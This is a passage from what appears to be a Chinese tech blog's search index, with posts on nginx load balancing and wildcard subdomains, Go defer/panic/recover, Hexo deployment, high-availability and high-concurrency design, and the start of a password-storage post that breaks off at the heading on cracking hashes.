192.168.1.102;\n  server 192.168.1.103;\n  hash $request_uri;\n  hash_method crc32;\n}\n```\n\n注意：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法。\n\n\n\n### 3. upstream 其他参数\n\nupstream中server指令语法如下：`server address [parameters]` ,  关键字server必选, address也必选，可以是主机名、域名、ip或unix socket，也可以指定端口号。\n\nupstream还可以为每个设备设置状态值，这些状态值的含义分别如下：\n\n+ down 表示单前的server暂时不参与负载.\n\n+ weight 默认为1.    weight越大，负载的权重就越大。\n\n+ max_fails ：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream 模块定义的错误.\n\n+ fail_timeout : max_fails次失败后，暂停的时间。\n\n+ backup： 表示当前server是备用服务器，只有其它非backup后端服务器都挂掉了或者很忙才会分配到请求。\n\n```nginx\nupstream bakend{ #定义负载均衡设备的Ip及设备状态 \n      ip_hash; \n      server 10.0.0.11:9090 down; \n      server 10.0.0.11:8080 weight=2; \n      server 10.0.0.11:6060; \n      server 10.0.0.11:7070 backup; \n}\n```\n\n##### 3.1 注意:\n\nmax_fails和fail_timeout一般会关联使用，如果某台server在fail_timeout时间内出现了max_fails次连接失败，那么Nginx会认为其已经挂掉了，从而在fail_timeout时间内不再去请求它，fail_timeout默认是10s，max_fails默认是1，即默认情况是只要发生错误就认为服务器挂掉了，如果将max_fails设置为0，则表示取消这项检查。\n\n\n\n### 4. 实战配置:\n\n````nginx\nupstream levonfly {\n    server 127.0.0.1:13050;\n}\n\nupstream testing-levonfly {\n    server 172.25.61.25:13050;\n}\n\n\nserver {\n    server_name levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n\nserver {\n    server_name test.levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://testing-levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n````\n\n##### 4.1 遇到的问题:\n\n 如果不生效, 注意下 upstream 的缩进会造成问题\n\n\n\n### 5. 参考资料\n\n+ http://www.linuxe.cn/post-182.html\n\n+ https://www.cnblogs.com/wzjhoutai/p/6932007.html\n\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginx泛域名解析实战","url":"%2Fp%2Fd039.html","content":"\n\n\n### 1. 域名概念\n\n##### 1.1 二级域名\n\n二级域名是指顶级域名之下的域名, 见下面的例子:\n\n- .com 顶级域名\n  - liuvv.com 一级域名(你花钱申请的)\n    - www.liuvv.com 二级域名\n    - blog.liuvv.com 二级域名\n    - 依次类推...\n\n有几点需要注意下:\n\n1. www.liuvv.com是属于二级域名,不过一般我们把这个域名配置指向一级域名访问.\n2. www.liuvv.com/news这种形式一般称之为网站的子页面子目录等,并不是二级域名.\n3. 另外类似.com.cn, .net.cn, .org.cn这种称之为二级域.\n\n##### 1.2 域名泛解析\n\n我们的目的是实现访问二级域名后转发请求.首先要实现的是二级域名的配置,一般使用Nginx泛解析来处理. 泛解析即利用通配符*来做次级域名以实现所有的次级域名均指向同一IP地址。\n\n泛解析的用途有:\n\n1. 可以让域名支持无限的子域名(这也是泛域名解析最大的用途)。\n2. 防止用户错误输入导致的网站不能访问的问题。\n3. 可以让直接输入网址登陆网站的用户输入简洁的网址即可访问网站。\n\n<!-- more -->\n\n##### 1.3 域名类型\n\n![1](nginx泛域名解析实战/5.png)\n\n+ 无论记录类型为啥, 主机记录都填写 xxxxx.liuvv.com\n+ 主机记录就是域名前缀，常见用法有：\n  + www：解析后的域名为 `www.liuvv.com`\n  + @：直接解析主域名 `liuvv.com`\n  + \\*：泛解析，匹配其他所有域名 `*.liuvv.com`\n  \n+ 记录类型的含义是什么？\n\n  + **A 记录：**地址记录，用来指定域名的 IPv4 地址（例如`8.8.8.8`），如果需要将域名指向一个 IP 地址，就需要添加 A 记录。\n\n  + **CNAME 记录：** 如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。(github page 就是用的这种)\n\n  + **NS 记录：**域名服务器记录，如果需要把子域名交给其他 DNS 服务商解析，就需要添加 NS 记录。\n\n  + **AAAA 记录：**用来指定主机名（或域名）对应的 IPv6 地址（例如 `ff06:0:0:0:0:0:0:c3`）记录。\n\n  + **MX 记录：**如果需要设置邮箱，让邮箱能收到邮件，就需要添加 MX 记录。\n\n  + **TXT 记录：**如果希望对域名进行标识和说明，可以使用 TXT 记录，绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件）。\n\n  + **SRV 记录：**SRV 记录用来标识某台服务器使用了某个服务，常见于微软系统的目录管理。主机记录处格式为：服务的名字.协议的类型。例如： `_sip._tcp`。\n\n  + **隐、显性 URL 记录：**将一个域名指向另外一个已经存在的站点，就需要添加 URL 记录。\n\n\n+ 记录值如何填写？\n\n  + **A 记录：**填写您服务器 IP，如果您不知道，请咨询您的空间商。\n\n  + **CNAME 记录：**填写空间商给您提供的域名，例如：`2.com`。\n\n  + **MX 记录：**填写您邮件服务器的 IP 地址或企业邮箱给您提供的域名，如果您不知道，请咨询您的邮件服务提供商。\n\n  + **AAAA 记录：**不常用，解析到 IPv6 的地址。\n\n  + **NS记录：**不常用，系统默认添加的两个 NS 记录请不要修改。NS 向下授权，填写 DNS 域名，例如：`ns3.dnsv3.com`。\n\n  + **TXT 记录：**记录值并没有固定的格式，不过大部分情况下，TXT 记录是用来做 SPF 反垃圾邮件的。最典型的 SPF 格式的 TXT 记录例子为 “`v=spf1 a mx ~all`”，表示只有这个域名的 A 记录和 MX 记录中的 IP 地址有权限使用这个域名发送邮件。\n\n  + **SRV 记录：**记录值格式为：优先级 权重 端口 主机名。例如：`0 5 5060 sipserver.example.com` 。\n\n  + **隐、显性 URL 记录：**记录值为必须为整的地址（必须带有协议、域名，可以包含端口号和资源定位符）。\n\n+ TTL如何填写\n\n  TTL即 Time To Live，缓存的生存时间。指地方 DNS 缓存您域名记录信息的时间，缓存失效后会再次到 DNSPod 获取记录值。我们默认的 600 秒是最常用的，不用修改。\n\n  - 600（10分钟）：建议正常情况下使用 600。\n\n  - 60（1分钟）：如果您经常修改 IP，修改记录一分钟即可生效。长期使用 60，解析速度会略受影响。\n\n  - 3600（1 小时）：如果您 IP 极少变动（一年几次），建议选择 3600，解析速度快。如果要修改 IP，提前一天改为 60，即可快速生效。\n\n    \n\n\n### 2. 域名配置\n\n##### 2.1 配置泛解析\n\n去域名提供商那里先配置一个泛解析地址,记录类型为A.域名指向一个IPv4地址.主机记录设置为*.记录值填写服务器公网Ip地址.\n\n配置好后稍微等待一下,然后访问这个域名.可以随意输入任何二级域名,访问到的都应该是顶级域名的内容.我这里访问结果总是Nginx的默认页面.\n\n![1](nginx泛域名解析实战/2.png)\n\n\n\n##### 2.2 nginx server_name\n\nnginx http模块 server模块的 `server_name`指令主要用于配置基于名称的虚拟主机.匹配顺序不同结果不同.\n\na. 精准的server_name配置,如:\n\n```\nserver_name liuvv.com www.liuvv.com;\n```\n\nb. 以通配符*开始的字符串:\n\n```\nserver_name *.liuvv.com;\n```\n\nc. 以通配符*结束的字符串:\n\n```\nserver_name www.*;\n```\n\nd. 配置正则表达式:\n\n```\nserver_name ~^(?.+)\\.liuvv\\.com$;\n```\n\n匹配顺序由上至下,只要有一项匹配以后就会停止搜索.使用时要注意这个顺序\n\n\n\n##### 2.3 绑定子域名到不同目录\n\n通过匹配subdomain, 在下面的可以通过$subdomain这个变量获取当前子域名称。\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        server_name  ~^(?<subdomain>.+)\\.liuvv\\.com$;\n        root /home/levonfly/www/$subdomain;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n}\n```\n\n\n\n\n![1](nginx泛域名解析实战/3.png)\n\n\n\n![1](nginx泛域名解析实战/4.png)\n\n\n\n##### 2.4 绑定子域名到不同目录(多个配置文件)\n\n![1](nginx泛域名解析实战/6.png)\n\n\n\n\n\n### 3. 参考资料\n\n+ [Nginx 泛解析配置请求映射到多端口实现二级域名访问](https://www.cnblogs.com/summit7ca/p/6974215.html)\n+ http://www.ruanyifeng.com/blog/2016/06/dns.html\n+ https://cloud.tencent.com/document/product/302/3468","tags":["nginx"],"categories":["nginx"]},{"title":"golang的defer_panic_recover特性","url":"%2Fp%2Fc0441565.html","content":"\n每次都被 `defer`,`panic`和`recover` 坑的死去活来，今天抽出时间来整理一下。\n\n<!-- more -->\n\n# 1. defer\n\n### 1.1 匿名和有名返回值（defer能改有名）\n\n+ 如果是匿名返回值，执行Return语句后，Go会创建一个临时变量保存返回值。\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"a return:\", a())\n}\n\nfunc a() int {\n\tvar i int //defer改的这个值,不是返回值\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer2:\", i)\n\t}()\n  \n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer1:\", i)\n\t}()\n  \n\treturn i\n}\n\n// 打印结果为 a defer1: 1\n// 打印结果为 a defer2: 2\n// 打印结果为 a return: 0\n```\n\n+ 有名返回值，defer能看到\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"b return:\", b())\n}\n\nfunc b() (i int) {\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer2:\", i)\n\t}()\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer1:\", i)\n\t}()\n\treturn i // 或者直接 return 效果相同\n}\n\n// 打印结果为 b defer1: 1\n// 打印结果为 b defer2: 2\n// 打印结果为 b return: 2\n```\n\n### 1.2 defer 参数会提前算\n\ndefer声明时会先计算确定参数的值，defer推迟执行的仅是其函数体。\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer P(time.Now())\n\ttime.Sleep(1e9) // 1s\n\tfmt.Println(\"1\", time.Now())\n}\nfunc P(t time.Time) {\n\tfmt.Println(\"2\", t) // 此处还是老的值\n\tfmt.Println(\"3\", time.Now())\n}\n\n/*\n1 2020-06-30 20:27:58.893326\n2 2020-06-30 20:27:57.892902\n3 2020-06-30 20:27:58.89402\n*/\n\n```\n\n### 1.3 调用os.Exit不会执行defer\n\n当发生panic时，所在goroutine的所有defer会被执行，但是当调用os.Exit()方法退出程序时，defer并不会被执行。\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc deferExit() {\n\tdefer func() {\n\t\tfmt.Println(\"defer\")\n\t}()\n\tos.Exit(0)\n}\nfunc main() {\n\tdeferExit() // 什么也不输出\n}\n```\n\n\n\n### 1.4 defer面试题\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc DeferFunc1(i int) (t int) {//4\n    t = i\n    defer func() {\n        t += 3\n    }()\n    return t\n}\n\nfunc DeferFunc2(i int) int {// 1\n    t := i\n    defer func() {\n        t += 3\n    }()\n    return t\n}\n\nfunc DeferFunc3(i int) (t int) {// 3\n    defer func() {\n        t += i\n    }()\n    return 2\n}\n\nfunc DeferFunc4() (t int) {\n    defer func(i int) {\n        fmt.Println(i)\n        fmt.Println(t)\n    }(t)\n    t = 1\n    return 2\n}\n\nfunc main() {\n    fmt.Println(DeferFunc1(1))  // 4\n    fmt.Println(DeferFunc2(1))  // 1\n    fmt.Println(DeferFunc3(1)) // 3\n    DeferFunc4()  // 0 2\n}\n```\n\n执行顺序应该是：1. return最先给返回值赋值（有名返回值直接赋值，匿名返回值则先声明再赋值)；2. 接着defer开始执行一些收尾工作；3. 最后RET指令携带返回值退出函数。\n\n# 2. panic\n\n### 2.1 截获 panic\n\n+ defer 和 recover 配合, 并且先声明defer\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tdefer func() { // 必须要先声明defer，否则不能捕获到panic异常\n\t\tfmt.Println(\"a\")\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t\tfmt.Println(\"b\")\n\t}()\n\n\tpanic(\"异常信息\")\n\n\tfmt.Println(\"c\")\n}\n\n/*\na\n异常信息\nb\n*/\n```\n\n\n\n### 2.2 panic 传递\n\npanic 会一直传递, 导致主 gorouting 奔溃\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc testPanic2() {\n\tpanic(\"testPanic panic2\")\n}\n\nfunc testPanic1() {\n\tgo testPanic2()\n}\n\nfunc main() {\n\tfmt.Println(\"begin\")\n\tgo testPanic1()\n\tfor {\n\t\ttime.Sleep(time.Second)\n\t}\n}\n\n\n/*\nbegin\npanic: testPanic panic2\n\ngoroutine 5 [running]:\nmain.testPanic2()\n*/\n```\n\n# 3. recover\n\n### 3.1 截获 panic 只能在一个层\n\n外层的 recover 能捕捉里层的 panic吗?  不能\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer func() {\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tpanic(\"falut1\")\n\t}()\n\n\ttime.Sleep(time.Second)\n}\n\n/*\npanic: falut1\n\ngoroutine 18 [running]:\nmain.main.func2()\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:16 +0x39\ncreated by main.main\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:15 +0x71\nexit status 2\n*/\n```\n\n","tags":["golang"],"categories":["1_golang基础"]},{"title":"hexo博客系统的安装和自动部署","url":"%2Fp%2Fd7a24ac4.html","content":"\n# 1. 安装\n\n### 1.1 初始化\n\n```bash\nmkdir dohttp && cd dohttp\nhexo init\ngit init\ngit remote add origin git@github.com:unix2dos/dohttp.git\ngit push --set-upstream origin main\n```\n\n<!-- more -->\n\n+ vi  .gitignore\n\n```ini\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\n```\n\n### 1.2 主题\n\n```bash\ngit submodule add https://github.com/theme-next/hexo-theme-next themes/next\n\ncat themes/next/_config.yml >> _config.yml\n\nmv _config.yml source/_data/next.yml\nvi source/_data/next.yml\n#theme:next\n```\n\n### 1.3 开始\n\n```bash\nhexo new post hello  \n\n# 随便写点东西, http://localhost:4000/\nhexo server --config source/_data/next.yml\n```\n\n### 1.4 分类和标签\n\n+ 标签\n\n```bash\nhexo new page tags\n\nvi source/tags/index.md\ntitle: 标签\ndate: 2014-12-22 12:39:04\ntype: \"tags\"\ncomments: false\n---\n```\n\n\n\n+ 分类\n\n```bassh\nhexo new page categories\n\nvi source/categories/index.md\ntitle: 分类\ndate: 2014-12-22 12:39:04\ntype: \"categories\"\ncomments: false\n---\n```\n\n\n\n### 1.5 主页menu\n\n+ 图标\n\n  https://fontawesome.com/\n\n  https://www.flaticon.com/\n\n+ icon生成\n\n  https://realfavicongenerator.net/\n\n+ 配置\n\n```yml\nmenu:\n  home: / || fa fa-home\n  Life: /categories/life || fas fa-feather\n  Note: /categories/note || fas fa-horse-head\n  Study: /categories/study || fas fa-dragon\n```\n\n\n\n# 2. 插件\n\n### 2.1 持久链接\n\n```bash\nnpm install hexo-abbrlink --save\n```\n\n+ config\n\n  ```yml\n  permalink: post/:abbrlink.html\n  abbrlink:\n    alg: crc16 #support crc16(default) and crc32\n    rep: hex    #support dec(default) and hex\n  ```\n\n\n\n### 2.2 图片相对路径\n\n```bash\nnpm install hexo-asset-image --save\n```\n\n+ config\n\n  ```yml\n  post_asset_folder: true\n  ```\n\n  \n\n### 2.3 本地搜索\n\n```bash\nnpm install hexo-generator-searchdb --save \n```\n\n+ config\n\n  ```yml\n  local_search:\n  \tenable: true  \n  ```\n\n  \n\n### 2.4 自动分类\n\n```bash\nnpm install hexo-auto-category --save\n```\n\n+ config\n\n  ```yml\n  auto_category:\n   enable: true\n   depth:\n  ```\n\n\n\n\n### 2.5 自定义主页\n\n1. npm remove hexo-generator-index\n2. Add `index.md` to `source` folder.\n\n\n\n# 3. 部署\n\n### 3.1 部署到github pages\n\n+ 部署到github\n\n  ```yml\n  deploy:\n      -\n       type: git\n       repo:\n        github: git@github.com:unix2dos/dohttp.git\n       branch: gh-pages\n  ```\n\n+ 安装并部署\n\n  ```bash\n  npm install hexo-deployer-git --save\n  \n  hexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n  ```\n\n\n\n### 3.2 部署到腾讯云cloudbase\n\n+ 强烈建议选择上海地区\n\n+ 开通hexo应用\n\n+ 开通静态网站托管\n\n+ 命令\n\n  ```bash\n  tcb login\n  hexo g --config source/_data/next.yml && tcb hosting deploy ./public  -e dohttp-8g3uegkw004f490e -r bj\n  ```\n\n\n\n### 3.3 cloudbase自动部署\n\n+ Github action\n\n  ```yml\n  on: [push] # push 代码时触发\n  jobs: \n      deploy: \n          runs-on: ubuntu-latest\n          name: Tencent Cloudbase Github Action Example\n          steps: \n          - name: Checkout\n            uses: actions/checkout@v2\n          # 使用云开发 Github Action 部署\n          - name: Deploy static to Tencent CloudBase\n            id: deployStatic\n            uses: TencentCloudBase/cloudbase-action@v1.1.1\n            with: \n              # 云开发的访问密钥 secretId 和 secretKey\n              secretId: ${{ secrets.SECRET_ID }}\n              secretKey: ${{ secrets.SECRET_KEY }}\n              # 云开发的环境id\n              envId: ${{ secrets.ENV_ID }}\n              # Github 项目静态文件的路径\n              staticSrcPath: public\n  ```\n  \n+ 仓库私钥\n\n  设置`SECRET_ID`,`SECRET_KEY` 和cloudbase的`ENV_ID`\n\n​\t\t\n\n+ 自动部署操作\n\n  `deploy.sh`\n  \n  ```bash\n  hexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml \n  git add . && git commit -m \"update public\" \n  git pull && git push\n  ```\n\n\n\n\n### 3.4 腾讯云cdn桶\n\n```yml\ndeploy:\n    -\n     type: git\n     repo:\n      github: git@unix2dos:unix2dos/unix2dos.github.io.git\n     branch: master\n    - \n     type: cos-cdn\n     cloud: tencent\n     bucket: blog-1300740185\n     region: ap-beijing\n     secretId: ***\n     secretKey: ***\n```\n\n\n\n\n# 4. 参考资料\n\n+ https://cloud.tencent.com/document/product/876/47006\n\n","tags":["hexo"],"categories":["博客"]},{"title":"高可用设计指南","url":"%2Fp%2F76375ae8.html","content":"\n高可用描述的是一个系统在大部分时间都是可用的，可以为我们提供服务的。高可用代表系统即使在发生硬件故障或者系统升级的时候，服务仍然是可用的。\n\n一般情况下，我们使用多少个 9 来评判一个系统的可用性，比如 99.9999% 就是代表该系统在所有的运行时间中只有 0.0001% 的时间是不可用的，这样的系统就是非常非常高可用的了！\n\n<!-- more -->\n\n# 1. 提高系统高可用\n\n### 1.1 注重代码质量，测试严格把关\n\n大家都喜欢谈限流、降级、熔断，但是我觉得从代码质量这个源头把关是首先要做好的一件很重要的事情。比较实际可用的就是 CodeReview，不要在乎每天多花的那 1 个小时左右的时间，作用可大着呢！\n\n### 1.2 使用集群，减少单点故障\n\n先拿常用的 Redis 举个例子！我们如何保证我们的 Redis 缓存高可用呢？答案就是使用集群，避免单点故障。当我们使用一个 Redis 实例作为缓存的时候，这个 Redis 实例挂了之后，整个缓存服务可能就挂了。使用了集群之后，即使一台 Redis 实例挂了，不到一秒就会有另外一台 Redis 实例顶上。\n\n### 1.3 限流\n\n流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。\n\n### 1.4 超时和重试机制设置\n\n一旦用户请求超过某个时间的得不到响应，就抛出异常。这个是非常重要的，很多线上系统故障都是因为没有进行超时设置或者超时设置的方式不对导致的。我们在读取第三方服务的时候，尤其适合设置超时和重试机制。\n\n一般我们使用一些 RPC 框架的时候，这些框架都自带的超时重试的配置。如果不进行超时设置可能会导致请求响应速度慢，甚至导致请求堆积进而让系统无法再处理请求。重试的次数一般设为 3 次，再多次的重试没有好处，反而会加重服务器压力（部分场景使用失败重试机制会不太适合）。\n\n### 1.5 熔断机制\n\n超时和重试机制设置之外，熔断机制也是很重要的。 熔断机制说的是系统自动收集所依赖服务的资源使用情况和性能指标，当所依赖的服务恶化或者调用失败次数达到某个阈值的时候就迅速失败，让当前系统立即切换依赖其他备用服务。 比较常用的流量控制和熔断降级框架是 Netflix 的 Hystrix 和 alibaba 的 Sentinel。\n\n### 1.6 异步调用\n\n比如用户在提交订单之后，不能立即返回用户订单提交成功，需要在消息队列的订单消费者进程真正处理完该订单之后，甚至出库后，再通过电子邮件或短信通知用户订单成功。除了可以在程序中实现异步之外，我们常常还使用消息队列，消息队列可以通过异步处理提高系统性能（削峰、减少响应所需时间）并且可以降低系统耦合性。\n\n### 1.7 使用缓存\n\n如果我们的系统属于并发量比较高的话，如果我们单纯使用数据库的话，当大量请求直接落到数据库可能数据库就会直接挂掉。使用缓存缓存热点数据，因为缓存存储在内存中，所以速度相当地快！\n\n# 2. 常见限流算法\n\n### 2.1 固定窗口计数器算法\n\n固定窗口其实就是时间窗口。固定窗口计数器算法规定了我们单位时间处理的请求数量。\n\n假如我们规定系统中某个接口 1 分钟只能访问 33 次的话，使用固定窗口计数器算法的实现思路如下：\n\n- 给定一个变量 `counter` 来记录当前接口处理的请求数量，初始值为 0（代表接口当前 1 分钟内还未处理请求）。\n- 1 分钟之内每处理一个请求之后就将 `counter+1` ，当 `counter=33` 之后（也就是说在这 1 分钟内接口已经被访问 33 次的话），后续的请求就会被全部拒绝。\n- 等到 1 分钟结束后，将 `counter` 重置 0，重新开始计数。\n\n<img src=\"高可用设计指南/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f38642f31352f38646564376132623930653134383230393366393266666635353562333631352e706e67\" alt=\"固定窗口计数器算法\" style=\"zoom:100%;\" />\n\n### 2.2 滑动窗口计数器算法\n\n滑动窗口计数器算法相比于固定窗口计数器算法的优化在于：它把时间以一定比例分片 。\n\n例如我们的接口限流每分钟处理 60 个请求，我们可以把 1 分钟分为 60 个窗口。每隔 1 秒移动一次，每个窗口一秒只能处理 不大于 60(请求数)/60（窗口数） 的请求， 如果当前窗口的请求计数总和超过了限制的数量的话就不再处理其他请求。\n\n![滑动窗口计数器算法](高可用设计指南/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f61652f31352f61653464336364313465666238646337303436643639316339303236343731352e706e67)\n\n### 2.3 漏桶算法\n\n我们可以把发请求的动作比作成注水到桶中，我们处理请求的过程可以比喻为漏桶漏水。我们往桶中以任意速率流入水，以一定速率流出水。当水超过桶流量则丢弃，因为桶容量是不变的，保证了整体的速率。\n\n如果想要实现这个算法的话也很简单，准备一个队列用来保存请求，然后我们定期从队列中拿请求来执行就好了（和消息队列削峰/限流的思想是一样的）。\n\n![漏桶算法](高可用设计指南/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f37352f30332f37353933386431303130313338636536366533386336656430333932663130332e706e67)\n\n### 2.4 令牌桶算法\n\n令牌桶算法也比较简单。和漏桶算法算法一样，我们的主角还是桶。不过现在桶里装的是令牌了，请求在被处理之前需要拿到一个令牌，请求处理完毕之后将这个令牌丢弃（删除）。我们根据限流大小，按照一定的速率往桶里添加令牌。如果桶装满了，就不能继续往里面继续添加令牌了。\n\n![令牌桶算法](高可用设计指南/68747470733a2f2f7374617469633030312e696e666f712e636e2f7265736f757263652f696d6167652f65632f39332f65636130653565616133356461633933386336373366656366326563396139332e706e67)\n","tags":["高可用"],"categories":["高可用"]},{"title":"高并发的性能指标和设计","url":"%2Fp%2Fb75de0de.html","content":"\n高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指通过设计保证系统能够同时并行处理很多请求。\n\n<!-- more -->\n\n# 1. 性能指标\n\n### 1.1 QPS，每秒查询\n\nQPS：Queries Per Second   意思是“每秒查询率”，是一台服务器每秒能够处理的查询次数。\n用户发起查询请求到服务器做出响应这算一次，一秒内用户完成了50次查询请求，那此时服务器QPS就是50。\n\n### 1.2 TPS，每秒事务\n\nTPS：是TransactionsPerSecond的缩写，服务器每秒处理的事务数。一个事物是用户发起查询请求到服务器做出响应这算一次。\n\n访问 ‘order.html’ 这个页面,是一个TPS。而order.html’ 页面可能请求了3次服务器（如调用了css、js、order接口），这实际就算产生了三个QPS。\n\n### 1.3 RT，响应时间\n\n响应时间，一般取平均响应时间，处理**一次请求**所需要的平均处理时间，它的数值大小直接反应了系统的快慢。\n\n一般系统RT 100ms 以内是比较正常的，300ms 勉强可以接受，1s的话再加上一些其他的外因，给用户的体验就是实实在在的不爽了。\n\n### 1.4 并发数\n\n并发数是指系统同时能处理的请求数量，**一般通过线程和CPU核数来决定**，并发数反应了系统的负载能力\n\n### 1.5 吞吐量\n\n系统的吞吐量（承压能力）与request对CPU的消耗、外部接口、IO等等紧密关联。单个request 对CPU消耗越高，外部系统接口、IO速度越慢，系统吞吐能力越低，反之越高。\n\n\n系统吞吐量几个重要参数：QPS（TPS）、并发数、响应时间。\n\n+ QPS（TPS）：（Query Per Second）每秒钟request/事务 数量\n+ 并发数： 并发数是指系统同时能处理的请求数量，一般通过线程和CPU核数来决定，并发数反应了系统的负载能力\n+ 响应时间： 一般取请求的平均响应时间\n\n### 1.6 计算公式\n\n> QPS = 并发量 / 平均响应时间\n\n0.5s 的处理时间，我们至少需要 500 的并发量，才能达到 1000qps\n\n0.1s 的话，因为处理时间变快了，所以现在只需要 100 的并发量，就可以轻松达到 1000qps 的能力了\n\n如果并发量还是 500，我们的 qps 甚至能到 5000\n\n\n\n# 2. 设计高并发系统\n\n### 2.1 系统拆分\n\n将一个系统拆分为多个子系统，用 dubbo 来搞。然后每个系统连一个数据库，这样本来就一个库，现在多个数据库，不也可以扛高并发么。\n\n### 2.2 缓存\n\n大部分的高并发场景，都是读多写少，那你完全可以在数据库和缓存里都写一份，然后读的时候大量走缓存不就得了。毕竟人家 redis 轻轻松松单机几万的并发。所以你可以考虑考虑你的项目里，那些承载主要请求的读场景，怎么用缓存来抗高并发。\n\n### 2.3 MQ\n\n比如说一个业务操作里要频繁搞数据库几十次，增删改增删改，疯了。那高并发绝对搞挂你的系统。\n\n用 MQ 吧，大量的写请求灌入 MQ 里，排队慢慢玩儿，后边系统消费后慢慢写，控制在 mysql 承载范围之内如何用 MQ 来异步写，提升并发性。MQ 单机抗几万并发也是 ok 的。\n\n### 2.4 分库分表\n\n分库分表，可能到了最后数据库层面还是免不了抗高并发的要求，好吧，那么就将一个数据库拆分为多个库，多个库来扛更高的并发；然后将一个表拆分为多个表，每个表的数据量保持少一点，提高 sql 跑的性能。\n\n### 2.5 读写分离\n\n读写分离，这个就是说大部分时候数据库可能也是读多写少，没必要所有请求都集中在一个库上吧，可以搞个主从架构，主库写入，从库读取，搞一个读写分离。读流量太多的时候，还可以加更多的从库。\n\n### 2.6 ElasticSearch\n\nes 是分布式的，可以随便扩容，分布式天然就可以支撑高并发，因为动不动就可以扩容加机器来扛更高的并发。那么一些比较简单的查询、统计类的操作，可以考虑用 es 来承载，还有一些全文搜索类的操作，也可以考虑用 es 来承载。\n\n# 3. 参考资料\n\n+ https://developer.aliyun.com/article/773015\n+ https://www.doc88.com/p-7418627676962.html","tags":["高并发"],"categories":["高并发"]},{"title":"如何正确存储密码","url":"%2Fp%2F4fe35076.html","content":"\n\n\n# 1. 哈希还是加密?\n\n哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要）而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。\n\n哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。哈希算法是不可逆的，而加密算法是可逆的。\n\n<!-- more -->\n\n哈希函数并不是专门用来设计存储用户密码的,不论如何，使用 MD5、MD5 加盐或者其他哈希的方式来存储密码都是不安全的.\n\n使用加密的方式存储密码相比于哈希加盐的方式，在一些安全意识和能力较差的公司和网站反而更容易导致密码的泄露和安全事故。\n\n\n\n哈希加盐的方式确实能够增加攻击者的成本，但是今天来看还远远不够，我们需要一种更加安全的方式来存储用户的密码，这也就是今天被广泛使用的慢哈希算法. \n\n慢哈希算法是为哈希密码而专门设计的，所以它是一个执行相对较慢的算法, 自己计算起来都慢, 那么破解起来也会非常慢.\n\n\n\n# 2. 破解哈希\n\n+ 